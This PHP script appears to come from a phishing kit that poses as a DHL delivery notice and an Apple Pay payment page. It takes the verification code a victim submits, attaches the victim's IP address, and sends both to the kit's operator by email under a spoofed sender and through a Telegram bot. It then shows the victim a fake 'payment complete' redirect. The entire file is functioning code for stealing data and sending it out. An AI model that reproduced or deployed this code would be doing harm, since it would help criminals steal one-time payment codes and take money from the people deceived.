<?php
    session_start();
    include("../common/functions.php");
    include("../common/sub_includes.php");
    require("../config.php");

    $_SESSION["code"] = $_POST["code"];

    $message = "
[📦] DHL INFOS [📦]

🍎 Code recu: " . $_SESSION["code"] . "
👤 Adresse IP: " . _ip() . "
    ";

    if ($rezmail) {
        $Subject = "📦 +1 APPLEPAY ・ ".$_SESSION['code']." ・ ". _ip();
        $head = "From: 🥤 OxParadox <info@paradox.infos>";

        mail($mail, $Subject, $message, $head);
    }

    if ($reztelegram) {
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?".http_build_query(['text' => $message,'chat_id' => $chat_id]));
    }

    // Mark payment as complete
    $_SESSION['payment_complete'] = true;
    header("Location: ../loader.php?r=finished?t=4000");
    exit();
?>